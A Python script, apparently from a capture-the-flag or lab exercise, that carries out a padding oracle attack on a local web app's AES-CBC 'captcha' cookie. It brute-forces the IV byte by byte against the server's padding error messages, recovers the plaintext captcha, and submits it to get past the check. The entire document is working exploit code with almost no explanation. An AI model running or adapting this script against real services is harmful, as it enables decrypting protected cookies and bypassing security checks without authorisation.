import base64
import requests
import time

# Configuration
base_url = "http://127.0.0.1:32834"
cookie_name = "captcha"
target_cookie = "2mArom13+gd4q/dQTQu4aFVpwOkejaqPtWuV0Kyn2ls="

# Decode the base64 cookie
cookie_bytes = base64.b64decode(target_cookie)
BLOCK_SIZE = 16
blocks = [cookie_bytes[i:i+BLOCK_SIZE] for i in range(0, len(cookie_bytes), BLOCK_SIZE)]

print(f"[+] Robust Padding Oracle Attack")
print(f"[+] Cookie has {len(blocks)} blocks")

def make_request(modified_cookie):
    """Make a request with modified cookie and return response text"""
    try:
        session = requests.Session()
        session.cookies.set(cookie_name, modified_cookie)
        
        # Submit registration form
        data = {
            'username': 'testuser',
            'captcha': 'test',
            'submit': 'Submit'
        }
        
        resp = session.post(base_url, data=data, timeout=5)
        return resp.text, resp.status_code
    except Exception as e:
        return f"Error: {e}", -1

def is_valid_padding(response_text):
    """Check if response indicates valid padding"""
    # "Invalid CAPTCHA!" means padding was valid but CAPTCHA content was wrong
    return "Invalid CAPTCHA!" in response_text or "Invalid username" in response_text

def is_padding_error(response_text):
    """Check if response indicates padding error"""
    return "Invalid padding" in response_text or "Internal Server Error" in response_text

def padding_oracle_single_block(iv, ciphertext):
    """Perform padding oracle attack on a single block"""
    decrypted = bytearray(BLOCK_SIZE)
    iv_array = bytearray(iv)
    
    print(f"\n[*] Attacking block, IV: {iv_array.hex()}")
    
    # For each byte position (from last to first)
    for byte_pos in range(BLOCK_SIZE - 1, -1, -1):
        print(f"\n[+] Position {byte_pos:2d}: ", end="")
        
        padding_value = BLOCK_SIZE - byte_pos
        
        # Create test IV with known bytes set correctly
        test_iv = bytearray(iv_array)
        
        # Set all bytes after current position for proper padding
        for i in range(byte_pos + 1, BLOCK_SIZE):
            test_iv[i] = iv_array[i] ^ decrypted[i] ^ padding_value
        
        # Try all possible values for current byte
        found_guess = None
        for guess in range(256):
            # Create modified IV for this guess
            modified_iv = bytearray(test_iv)
            modified_iv[byte_pos] = iv_array[byte_pos] ^ guess ^ padding_value
            
            # Create full cookie
            test_cookie = modified_iv + ciphertext
            encoded_cookie = base64.b64encode(test_cookie).decode()
            
            # Make request
            response, status = make_request(encoded_cookie)
            
            # Check if this guess produces valid padding
            if is_valid_padding(response):
                found_guess = guess
                print(f"0x{guess:02x} ", end="", flush=True)
                break
        
        if found_guess is not None:
            decrypted[byte_pos] = found_guess
            char = chr(found_guess) if 32 <= found_guess <= 126 else '.'
            print(f"-> '{char}'")
        else:
            print("Failed")
            decrypted[byte_pos] = 0
    
    return bytes(decrypted)

# Two-block cookie: [IV][Ciphertext]
iv = blocks[0]
ciphertext = blocks[1]

print(f"[*] IV (Block 0): {iv.hex()}")
print(f"[*] Ciphertext (Block 1): {ciphertext.hex()}")

# Decrypt the ciphertext block
decrypted_block = padding_oracle_single_block(iv, ciphertext)

print(f"\n[+] Decrypted block (hex): {decrypted_block.hex()}")

# Remove PKCS#7 padding
padding_length = decrypted_block[-1]
if 1 <= padding_length <= BLOCK_SIZE:
    plaintext = decrypted_block[:-padding_length]
    print(f"[+] Padding length: {padding_length}")
    print(f"[+] Plaintext (hex): {plaintext.hex()}")
    
    # Try to decode
    try:
        captcha_solution = plaintext.decode('utf-8')
        print(f"[+] Plaintext (UTF-8): '{captcha_solution}'")
    except:
        try:
            captcha_solution = plaintext.decode('ascii', errors='replace')
            print(f"[+] Plaintext (ASCII): '{captcha_solution}'")
        except:
            captcha_solution = str(plaintext)
            print(f"[+] Plaintext (raw): {captcha_solution}")
else:
    print(f"[-] Invalid padding: {padding_length}")
    plaintext = decrypted_block
    try:
        print(f"[+] Decrypted without padding removal: '{plaintext.decode('utf-8', errors='replace')}'")
    except:
        print(f"[+] Raw decrypted: {plaintext.hex()}")

# Test the decrypted captcha solution
if 'captcha_solution' in locals():
    print(f"\n[+] Testing decrypted captcha: '{captcha_solution}'")
    
    session = requests.Session()
    session.cookies.set(cookie_name, target_cookie)
    
    data = {
        'username': 'testuser',
        'captcha': captcha_solution,
        'submit': 'Submit'
    }
    
    resp = session.post(base_url, data=data, timeout=5)
    print(f"[+] Response: '{resp.text}' (status: {resp.status_code})")
